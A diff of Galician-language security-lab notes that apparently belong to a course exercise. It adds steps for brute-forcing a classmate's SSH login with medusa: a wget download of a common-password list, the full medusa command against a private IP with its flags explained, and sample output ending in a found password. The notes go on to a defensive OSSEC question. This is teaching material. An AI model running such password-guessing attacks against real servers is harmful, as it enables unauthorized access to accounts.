@@ -689,9 +689,28 @@ Os diccionarios podemos facer nos un á man (un .txt con unhas cuantas contrase�
 
 Temos que facer  os ataques de medusa no directorio onde temos o diccionario.
 
-1) Instalamos medusa -> `apt install medusa`
+1º)Instalamos medusa -> `apt install medusa`
 
-2) No meu caso usei un .txt do github do enlace que ten 'click'. Para importar solo o diccionario, vamos dentro de un txt e en raw copiamos o enlace e clonamos -> `` 
+2º)No meu caso usei un .txt do github do enlace que ten 'click'. Para importar solo o diccionario, vamos dentro de un txt e en raw copiamos o enlace e descargamolo -> `wget enlace`
+
+3º)Dentro do directorio onde temos o diccionario executamos o seguinte comando -> `medusa -h 10.11.48.118 -u lsi -P 10k-most-common.txt -M ssh -f -O logpassguessing.log`
+
+	[-h] -> especificar a dirección IP
+ 	[-u] -> especificar o nombre da máquina
+	[-P] -> para pasar o archivo onde temos as contraseñas
+	[-M] ->  modulo que vamos emplear (sin a extension .mod)
+ 	[-f] -> parase ao encontrar a contraseña
+  	[-O] -> Crea un log
+	
+4º)Comprobar que funciona poñendo a contraseña do teu compañeiro no txt:
+
+	ACCOUNT CHECK: [ssh] Host: 10.11.48.118 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (1 of 10001 complete)
+	ACCOUNT CHECK: [ssh] Host: 10.11.48.118 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (2 of 10001 complete)
+	ACCOUNT CHECK: [ssh] Host: 10.11.48.118 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (3 of 10001 complete)
+	ACCOUNT CHECK: [ssh] Host: 10.11.48.118 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234 (4 of 10001 complete)
+	ACCOUNT CHECK: [ssh] Host: 10.11.48.118 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: XXXXXXXXX (5 of 10001 complete)
+	ACCOUNT FOUND: [ssh] Host: 10.11.48.118 User: lsi Password: blablablabla [SUCCESS]
+
 
 
 ### **19.-Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.**
